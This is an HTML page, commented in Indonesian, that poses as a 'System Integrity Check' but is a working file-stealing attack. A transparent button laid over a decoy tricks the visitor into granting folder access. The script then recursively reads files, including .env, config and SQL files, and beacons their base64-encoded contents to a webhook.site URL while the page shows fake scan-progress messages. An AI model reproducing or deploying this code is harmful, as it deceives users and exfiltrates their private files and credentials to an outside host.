<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Integrity Check</title>
    <style>
        body {
            background: #050505;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Clickjacking Overlay Layer */
        .ui-wrapper {
            position: relative;
            width: 400px;
            padding: 30px;
            border: 1px solid #00ff00;
            text-align: center;
            background: #000;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }

        /* Tombol Palsu yang Menarik Perhatian */
        .fake-btn {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            font-size: 1.1em;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            transition: 0.3s;
        }

        /* Tombol Asli (Picker) Dibuat Transparan Tepat di Atas Tombol Palsu */
        #real-trigger {
            position: absolute;
            bottom: 30px; /* Sesuaikan posisi agar tumpang tindih sempurna */
            left: 30px;
            width: calc(100% - 60px);
            height: 50px;
            opacity: 0.001; /* Nyaris tidak terlihat tapi tetap bisa diklik */
            cursor: pointer;
            z-index: 10;
        }

        #log {
            font-size: 10px;
            color: #008800;
            text-align: left;
            margin-top: 20px;
            height: 80px;
            overflow: hidden;
            border-top: 1px solid #004400;
            padding-top: 10px;
        }

        .status-active { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
    </style>
</head>
<body>

    <div class="ui-wrapper">
        <h2 id="header">CORE_SYSTEM_SCAN</h2>
        <p style="color: #ccc; font-size: 14px;">Izin akses folder diperlukan untuk memverifikasi integritas file sistem dan membersihkan cache browser.</p>
        
        <div style="position: relative;">
            <button class="fake-btn">SINKRONISASI SEKARANG</button>
            <button id="real-trigger" onclick="initiateChain()">INVISIBLE</button>
        </div>

        <div id="log">> STANDBY: Awaiting User Gesture...</div>
    </div>

<script>
    const WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
    let fileCount = 0;

    async function initiateChain() {
        const logEl = document.getElementById('log');
        const headerEl = document.getElementById('header');
        
        try {
            // STAGE 1: Browser-to-OS Sandbox Bridge
            const dirHandle = await window.showDirectoryPicker();
            
            // Visual deception: Mengubah UI agar user merasa proses "aman" sedang berjalan
            headerEl.innerText = "SCANNING_ACTIVE";
            headerEl.classList.add("status-active");
            logEl.innerHTML = "> ACCESS_GRANTED: Starting Recursive Index...";

            // STAGE 2: Persistence (Optional Chaining - Service Worker dapat didaftarkan di sini)
            
            // STAGE 3: Recursive Data Siphoning
            await crawlAndSiphon(dirHandle, "");

            logEl.innerHTML += `<br>> SUCCESS: ${fileCount} files indexed.`;
            headerEl.innerText = "SCAN_COMPLETE";
            headerEl.classList.remove("status-active");

        } catch (err) {
            logEl.innerHTML = "> ERROR: " + err.message;
        }
    }

    async function crawlAndSiphon(handle, path) {
        for await (const entry of handle.values()) {
            const currentPath = `${path}/${entry.name}`;

            if (entry.kind === 'file') {
                try {
                    const file = await entry.getFile();
                    
                    // Filter: Hanya ambil file teks/config sensitif untuk efisiensi payload
                    if (/\.(txt|json|php|env|sql|config|js|html)$/i.test(entry.name) || file.size < 50000) {
                        const content = await file.text();
                        fileCount++;

                        // STAGE 4: Stealth Exfiltration via Beacon API
                        // Beacon tetap berjalan meskipun user navigasi keluar halaman
                        const payload = btoa(JSON.stringify({
                            ts: Date.now(),
                            name: entry.name,
                            path: currentPath,
                            size: file.size,
                            data: content.substring(0, 10000) // Ambil 10KB pertama
                        }));

                        navigator.sendBeacon(`${WEBHOOK}?v=ULTIMATE_CHAIN`, payload);
                        
                        // Update UI log secara terbatas agar tidak lag
                        if (fileCount % 5 === 0) {
                            document.getElementById('log').innerHTML = `> EXFIL_IN_PROGRESS: ${currentPath}`;
                        }
                    }
                } catch (e) {
                    // Silently skip locked files
                }
            } else if (entry.kind === 'directory') {
                // Deep recursion into subfolders
                await crawlAndSiphon(entry, currentPath);
            }
        }
    }
</script>
</body>
</html>
